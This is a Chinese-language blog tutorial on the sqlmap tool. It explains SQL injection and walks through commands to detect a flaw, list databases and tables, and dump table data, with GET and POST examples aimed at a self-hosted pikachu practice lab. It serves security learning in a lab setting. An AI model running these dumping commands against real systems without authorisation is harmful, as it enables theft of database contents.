---
title: "sqlmap 工具使用"
date: "2026-03-13"
description: "sqlmap 自动化SQL注入工具使用教程，包含漏洞检测、数据库枚举、GET/POST请求实战案例。"
tags: ["Kali", "安全", "SQL注入"]
---

>sqlmap介绍
>
>sqlmap 是一款开源、自动化的SQL注入漏洞检测与利用工具，主要用于帮助安全测试人员、渗透测试工程师发现并验证Web应用程序中存在的SQL注入漏洞，进而评估漏洞可能带来的安全风险（如数据泄露、服务器控制权被夺取等）。它基于Python开发，支持多种数据库类型和注入技术，是Web安全领域最常用的工具之一。

### 什么是SQL注入

由于Web应用程序对用户输入的数据合法性没有过滤或者判断，攻击者可以在Web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。

![](/images/blog/kali/file-20260207105513000.png)

### sqlmap实战

>目标网站
>
>B站UP主(ID：**2005814455**)：http://a5fa4ee523e3.target.yijinglab.com/
>
><font color=red>        不建议使用，建议自己搭建，后续我将使用皮卡丘靶场</font>

1. 测试是否存在漏洞

```bash
sqlmap -u 测试网址
```

![](/images/blog/kali/file-20260207114759731.png)

(若存在类似于以下的信息则表示存在注入漏洞)

![](/images/blog/kali/file-20260207115133507.png)

2. 测试当前的数据库名字

```bash
sqlmap -u 测试网址 --dbs
```

![](/images/blog/kali/file-20260207115505172.png)

(此处为最终获取到的结果)

![](/images/blog/kali/file-20260207115607782.png)

3. 测试指定数据库中的数据表的信息

```bash
sqlmap -u 测试网址 -D 数据库名 --tables
```

![](/images/blog/kali/file-20260207161902753.png)

(此处为最终获取到的结果)

![](/images/blog/kali/file-20260207161950889.png)

4. 测试指定数据表中的数据（此处我使用的自己部署的pikachu靶场）

```bash
sqlmap -u 测试网址 -D 数据库名 -T 数据表名 [-C 字段名1,字段名2,...] --dump
```

![](/images/blog/kali/file-20260208101030974.png)

(此处为最终获取到的结果)

![](/images/blog/kali/file-20260208100930513.png)

>扫描缓存
>
>sqlmap扫描重复检测出已修复的漏洞，大概率是**缓存/扫描配置残留或修复未彻底**导致的。
>1. 扫描命令后直接添加 `--flush-session` 可以强制清空当前目标的会话缓存，且本次扫描不缓存
>2. Linux/Kali(彻底删除缓存目录)`/.local/share/sqlmap/`或`/usr/share/sqlmap/data/`
>3. Kali中可以使用命令一键删除：`rm -rf ~/.local/share/sqlmap/*`

**常错雷区**

注意区分 `GET` 请求和 `POST` 请求，它们的请求方式不同，以我的pikachu靶场为例：

`./pikachu/vul/sqli/sqli_str.php`
- 请求方式：`GET`
- 请求参数：`name=...&submit=查询`
- sqlmap扫描命令：`sqlmap -u "http://192.168.1.12:8888/pikachu/vul/sqli/sqli_str.php?name=zhangsan&submit=查询" --flush-session`

`./pikachu/vul/sqli/sqli_id.php`
- 请求方式：`POST`
- 请求参数：`id=...&submit=查询`
- sqlmap扫描命令：`sqlmap -u "http://192.168.1.12:8888/pikachu/vul/sqli/sqli_id.php" --data "id=5&submit=查询" --flush-session`

>提示
>
>此处的 `192.168.1.12:8888` 为我本地的pikachu靶场地址，扫描时更换为自己的既可
